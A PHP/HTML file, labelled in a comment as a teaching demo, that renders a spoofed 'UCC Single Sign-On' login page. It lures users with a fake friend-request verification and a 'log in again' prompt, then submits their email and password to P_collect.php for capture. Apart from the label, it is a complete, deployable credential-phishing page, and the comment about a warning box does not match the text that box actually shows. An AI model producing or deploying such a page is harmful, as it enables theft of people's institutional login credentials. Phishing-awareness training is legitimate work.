<?php /* Spoofed login page (teaching demo): submits to P_collect.php */ ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>UCC Single Sign‑On (Spoofed)</title>
<style>
:root{
--border:#e5e7eb;
--gray:#475569;
--note:#fde68a;
--note-bg:#fef3c7;
}

/* Layout & typography */
body{
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
background:#f4f6fa;
margin:0;
display:flex;
align-items:center;
justify-content:center;
min-height:100vh;
}

/* Card */
.box{
width:320px;
background:#fff;
border:1px solid var(--border);
border-radius:12px;
padding:18px;
}

h2{margin:0 0 6px 0;text-align:center}
.sub{margin:0 0 10px 0;text-align:center;color:var(--gray);font-size:13px}

/* "Password manager" nudge: highlights unfamiliar domain */
.warn{
background:var(--note-bg);
border:1px solid var(--note);
padding:8px;
border-radius:10px;
margin-bottom:10px;
font-size:12px;
color:#92400e;
}

label{display:block;margin-top:10px;font-size:13px;color:var(--gray)}
input{
width:100%;
padding:10px;
border:1px solid var(--border);
border-radius:10px;
margin-top:6px;
}

button{
width:100%;
margin-top:12px;
padding:10px;
border:0;
border-radius:10px;
background:#2563eb;
color:#fff;
cursor:pointer;
}

.minor{font-size:12px;color:#64748b;margin-top:10px;text-align:center}
a{text-decoration:none;color:#2563eb}
</style>
</head>
<body>
<div class="box">
<h2>UCC Single Sign‑On</h2>
<p class="sub">Use your university email to verify this friend request</p>
<div class="warn">For your account security, please log in again on this site!</div>

<!-- Spoofed login form --- data is captured by P_collect.php -->
<form method="POST" action="P_collect.php" autocomplete="off">
<label>Email</label>
<input type="email" name="email" 
       placeholder="Enter your email" 
       autocomplete="off"
       autocapitalize="off"
       autocorrect="off"
       value=""
       required />

<label>Password</label>
<input type="password" name="password" 
       placeholder="Enter your password" 
       autocomplete="new-password"
       value=""
       required />

<button type="submit">Sign in &amp; Verify</button>
</form>
</div>
</body>
</html>